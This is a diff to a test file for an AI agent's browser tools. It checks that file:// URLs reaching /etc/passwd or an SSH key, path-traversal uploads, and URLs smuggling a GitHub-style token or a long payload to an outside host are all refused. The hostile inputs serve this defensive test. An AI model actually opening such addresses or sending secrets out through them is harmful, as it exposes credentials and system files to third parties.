@@ -215,6 +215,16 @@ test("each tool is one agent-browser command in the agent's session, with its si
   expect((await b.call("browser_open", { url: "FILE:///etc/passwd" })).isError).toBe(true);
   expect((await b.call("browser_open", { url: "view-source:file:///etc/passwd" })).isError).toBe(true);
   expect((await b.call("browser_tabs", { action: "open", url: "FILE:///Users/x/.ssh/id_rsa" })).isError).toBe(true);
+  // An address carrying a key or a payload is refused before the browser opens it (ADR 0117).
+  const opens = () => b.calls.filter((c) => c.op === "browser.act" && (c.command === "open" || c.command === "tab"));
+  const openedBefore = opens().length;
+  expect((await b.call("browser_open", { url: `https://x.io/?k=ghp_${"A".repeat(36)}` })).data).toMatchObject({
+    code: "outbound.credential",
+  });
+  expect(
+    (await b.call("browser_tabs", { action: "open", url: `https://x.io/?d=${"q".repeat(600)}` })).data,
+  ).toMatchObject({ code: "outbound.long" });
+  expect(opens()).toHaveLength(openedBefore);
   expect(b.calls.filter((c) => c.op === "browser.act" && c.command === "tab" && c.args[0] === "new")).toHaveLength(0);
   expect((await b.call("browser_upload", { target: "e4", path: "../secrets.txt" })).isError).toBe(true);
   expect((await b.call("browser_upload", { target: "e4", path: "/Users/ana/x.pdf" })).isError).toBe(true);
